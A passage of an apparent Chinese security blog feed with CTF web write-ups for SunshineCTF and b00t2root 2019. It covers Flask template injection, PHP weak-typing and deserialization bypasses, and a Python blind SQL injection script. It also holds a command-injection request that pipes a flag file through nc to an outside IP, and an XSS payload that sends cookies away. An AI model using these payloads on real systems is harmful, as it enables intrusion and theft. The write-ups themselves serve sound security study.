class="name">firstName</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br></pre></td></tr></table></figure><p>返回的结果 <code>sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}</code></p><h2 id="0x03-Portfolio"><a href="#0x03-Portfolio" class="headerlink" title="0x03 Portfolio"></a>0x03 Portfolio</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>Check out my development portfolio! I’m just getting started, so don’t be too mean :(</p><p><a href="http://folio.sunshinectf.org" target="_blank" rel="noopener">http://folio.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-解题思路-2"><a href="#2-解题思路-2" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>首先web框架是flask；其次可以看到URL后面的参数是name，而页面对应的也是name；如果修改为zeroyu，则页面对应也显示zeroyu</p><p><img src="https://i.loli.net/2019/04/02/5ca2bdbf309c4.png" alt="7DBD4583-BD88-4783-86A8-613E8BF18018.png"></p><p> 但是如果我输入<code>9</code>的话并不会产生对应的计算</p><p><img src="https://i.loli.net/2019/04/02/5ca2bdd1e09fc.png" alt="7001968E-4A77-4187-9DFB-A4985F9085C2.png"></p><p> 之后访问另外一个界面，查看源代码发现一行提交信息被注释掉了，编辑html将注释去除并进行提交。 <img src="https://i.loli.net/2019/04/02/5ca2bde9f0ac0.png" alt="8156B4B1-2EE4-4BA2-BDF1-D0179ED07027.png"></p><p>但是并没有什么效果，所以不妨直接访问一下对应的路径，而不使用这个模板参数。 <code>http://folio.sunshinectf.org/templates/admin.html</code> 得到一些返回信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if config.DEBUG %&#125; &#123;&#123;config.FLAG&#125;&#125; &#123;% endif %&#125; Hi there!</span><br></pre></td></tr></table></figure><p>所以可以看到flag是在config中的，所以我们构造如下payload并利用<code>http://folio.sunshinectf.org/render</code>这个点，最终成功get flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i http://folio.sunshinectf.org/render --data &quot;template=hello/&#123;&#123;config.items()&#125;&#125;&quot; -L</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2be01903ae.png" alt="C67FB07F-C140-451D-B24D-EFF0AE88E180.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;比赛地址: &lt;a href=&quot;https://2019.sunshinectf.org/challe
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>b00t2root&#39;19 web writeup</title>
    <link href="http://zer0yu.github.io/2019/04/01/b00t2root-19-web/"/>
    <id>http://zer0yu.github.io/2019/04/01/b00t2root-19-web/</id>
    <published>2019-04-01T08:10:04.000Z</published>
    <updated>2019-04-01T08:13:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>比赛地址: <a href="http://3.17.26.191/" target="_blank" rel="noopener">http://3.17.26.191/</a></p><p>时间: 星期五, 三月 29, 11:30 PM (23:00) — 星期六, 三月 30, 11:30 PM (23:00)</p><h2 id="0x01-EasyPhp"><a href="#0x01-EasyPhp" class="headerlink" title="0x01 EasyPhp"></a>0x01 EasyPhp</h2><p>此题共分为以下三步：</p><ol><li>关于PHP 0e[0-9]+格式md5的弱类型校验</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$str1 = $_GET[<span class="string">'1'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'1'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str1 == md5($str1))&#123; </span><br><span class="line">        <span class="keyword">echo</span> $flag1; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>关于PHP hash函数的弱类型校验=&gt;数组形式2[]=1&amp;3[]=2使其返回null进而弱类型相等</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$str2 = $_GET[<span class="string">'2'</span>]; </span><br><span class="line">$str3 = $_GET[<span class="string">'3'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'3'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str2 !== $str3)&#123; </span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'md5'</span>, $salt . $str2) == hash(<span class="string">'md5'</span>, $salt . $str3))&#123; </span><br><span class="line">            <span class="keyword">echo</span> $flag2; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>PHP的序列化与反序列的引用类型<br>题目的源代码</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secrets</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $temp; </span><br><span class="line">    <span class="keyword">var</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'4'</span>])) &#123; </span><br><span class="line">    $str4 = $_GET[<span class="string">'4'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; </span><br><span class="line">        $str4=stripslashes($str4); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    $res = unserialize($str4); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($res) &#123; </span><br><span class="line">    $res-&gt;flag=$flag3; </span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;flag === $res-&gt;temp) </span><br><span class="line">            <span class="keyword">echo</span> $res-&gt;flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看如下两个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str4 = <span class="string">'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:3;&#125;'</span>;</span><br><span class="line">$res = unserialize($str4);</span><br><span class="line">print_r($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__PHP_Incomplete_Class Object</span><br><span class="line">(</span><br><span class="line">    [__PHP_Incomplete_Class_Name] =&gt; Secrets</span><br><span class="line">    [temp] =&gt;</span><br><span class="line">    [test] =&gt; 100</span><br><span class="line">    [flag] =&gt; 100</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str4 = <span class="string">'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:2;&#125;'</span>;</span><br><span class="line">$res = unserialize($str4);</span><br><span class="line">print_r($res);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__PHP_Incomplete_Class Object</span><br><span class="line">(</span><br><span class="line">    [__PHP_Incomplete_Class_Name] =&gt; Secrets</span><br><span class="line">    [temp] =&gt;</span><br><span class="line">    [test] =&gt; 100</span><br><span class="line">    [flag] =&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>所以我们可以使用反序列化中的引用类型来绕过此处的校验<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;Secrets&quot;:2:&#123;s:4:&quot;temp&quot;;N;s:4:&quot;flag&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Set-Me-Free"><a href="#0x02-Set-Me-Free" class="headerlink" title="0x02 Set Me Free"></a>0x02 Set Me Free</h2><p>使用Python3.7编写的具有二分查找功能的sql盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</span><br><span class="line"><span class="keyword">import</span> sys, math</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(query)</span>:</span></span><br><span class="line"> </span><br><span class="line">    data = parse.urlencode(&#123; <span class="string">'username'</span> : <span class="string">"') and if((%s),1,0) #"</span> % query &#125;).encode()</span><br><span class="line"> </span><br><span class="line">    req = request.Request(<span class="string">'http://3.16.68.122/smf/register.php'</span>, data = data)</span><br><span class="line">    req.get_method = <span class="keyword">lambda</span> : <span class="string">'POST'</span></span><br><span class="line">    res = request.urlopen(req).read().decode()</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> res.find(<span class="string">'User Not Registered'</span>) != <span class="number">-1</span>; <span class="comment"># means true</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greater_than_or_equal</span><span class="params">(query, i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send(<span class="string">'%s &gt;= %d'</span> % (query, i));</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">equal</span><span class="params">(query, i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> send(<span class="string">'%s = %d'</span> % (query, i));</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(query)</span>:</span></span><br><span class="line">    min_val = <span class="number">0</span></span><br><span class="line">    max_val = <span class="number">128</span></span><br><span class="line">     </span><br><span class="line">    <span class="keyword">while</span> min_val + <span class="number">1</span> &lt; max_val:</span><br><span class="line">        mid = math.floor((min_val + max_val) / <span class="number">2</span>)</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> greater_than_or_equal(query, mid):</span><br><span class="line">            min_val = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_val = mid</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> equal(query, min_val):</span><br><span class="line">        <span class="keyword">return</span> search(query)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> min_val</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(query)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> search(<span class="string">'length((%s))'</span> % query)</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_and_print_content</span><span class="params">(query, length)</span>:</span></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        content += chr(search(<span class="string">'ord(substr((%s), %d, 1))'</span> % (query, i + <span class="number">1</span>)))</span><br><span class="line">        sys.stdout.write(<span class="string">'\r[%s] %s%s'</span> % (length, content, <span class="string">'_'</span> * (length - len(content))))</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    arg = <span class="string">' '</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line">     </span><br><span class="line">    content_len = get_length(arg)</span><br><span class="line">    get_and_print_content(arg, content_len)</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://posix.tistory.com/84" target="_blank" rel="noopener">https://posix.tistory.com/84</a></p><h2 id="0x03-PingService"><a href="#0x03-PingService" class="headerlink" title="0x03 PingService"></a>0x03 PingService</h2><p>源码泄露<code>http://3.17.167.161/PingService/helper.php~</code><br>题目源代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>])&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>])&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"REMOTE_ADDR"</span>])&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_CLIENT_IP"</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"REMOTE_ADDR"</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">"Unknown"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m'</span>, $data))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&lt;center&gt;&lt;h2 style="color:red;"&gt;Shoo Go Away heckermen... Thats not an IP Address&lt;/h2&gt;&lt;/center&gt;'</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    $black_list = <span class="keyword">array</span>(<span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">" "</span>,<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="comment">// if(strpos($data, $key) !== false)&#123;</span></span><br><span class="line">        <span class="comment">//     die("&lt;center&gt; Not Allowed &lt;/center&gt;");</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        $data = str_replace($key, <span class="string">''</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据clean函数可以看出应该可能存在blind rce。根据getIP函数的内容，我们首先修改X-Forwarder-For字段为127.0.0.1之后返回了源代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&apos;helper.php&apos;);</span><br><span class="line">if (getIP() != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;./main.css&quot; media=&quot;all&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    die(&quot;Oye! This service is only for local client&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;link href=&quot;./main.css&quot; media=&quot;all&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div class=&quot;login&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;login-screen&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;app-title&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Ping Service&lt;/h1&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;login-form&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;control-group&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;login-field&quot; placeholder=&quot;8.8.8.8&quot; id=&quot;ip&quot; name=&quot;ip&quot;&gt;</span><br><span class="line">        &lt;label class=&quot;login-field-icon fui-user&quot; for=&quot;login-form&quot;&gt;&lt;/label&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-large btn-block&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt; </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;ip&apos;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_POST[&apos;ip&apos;])) &#123;</span><br><span class="line">    $ip = $_POST[&apos;ip&apos;];</span><br><span class="line">    $ip = &apos;ping -c 1 &apos;.clean($ip);</span><br><span class="line">    $res = str_replace(&quot;\n&quot;, &quot;&lt;/br&gt;\n&quot;, shell_exec($ip));</span><br><span class="line">    if(strpos($res, &quot;100% packet loss&quot;)!==false)&#123;</span><br><span class="line">      echo &quot;&lt;center&gt; &lt;h2 style=&apos;color:red&apos;&gt;Not Alive &lt;/h2&gt;&lt;/center&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      echo &quot;&lt;center&gt; &lt;h2 style=&apos;color:yellow&apos;&gt;Alive &lt;/h2&gt;&lt;/center&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源代码上已经确定是rce的一种利用，从clean函数中看到过滤了空格，但是我们可以使用<code>${IFS}</code>来bypass</p><p>最终的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /PingService/ HTTP/1.1</span><br><span class="line">Host: 3.17.167.161</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://3.17.167.161/PingService/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">x-forwarded-for:127.0.0.1</span><br><span class="line"></span><br><span class="line">ip=8.8.8.8%0a;cat$&#123;IFS%?&#125;flag.php|nc$&#123;IFS%?&#125;47.90.204.28$&#123;IFS%?&#125;2233</span><br></pre></td></tr></table></figure><p>返回的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">'b00t2root&#123;mr.s74rk_1_d0nt_feel_s0_g00d&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-eXquisite-Scenery-Sites"><a href="#0x04-eXquisite-Scenery-Sites" class="headerlink" title="0x04 eXquisite Scenery Sites"></a>0x04 eXquisite Scenery Sites</h2><p>IP转int<br><a href="http://www.bejson.com/convert/ip2int/" target="_blank" rel="noopener">http://www.bejson.com/convert/ip2int/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /Web-2/contact.php HTTP/1.1</span><br><span class="line">Host: 18.218.187.241</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://18.218.187.241/Web-2/contact.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 100</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=008185861a14c247da3b48a088fc8a75</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user=test&amp;Message=&lt;sCript&gt;document[&apos;location&apos;]=&apos;http://794479644:51/?&apos;%2Bdocument[&apos;cookie&apos;]&lt;/Script&gt;</span><br></pre></td></tr></table></figure><p>这次使用一句话服务器却怎么也接受不到bot发过来的请求，之后使用如下脚本就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span 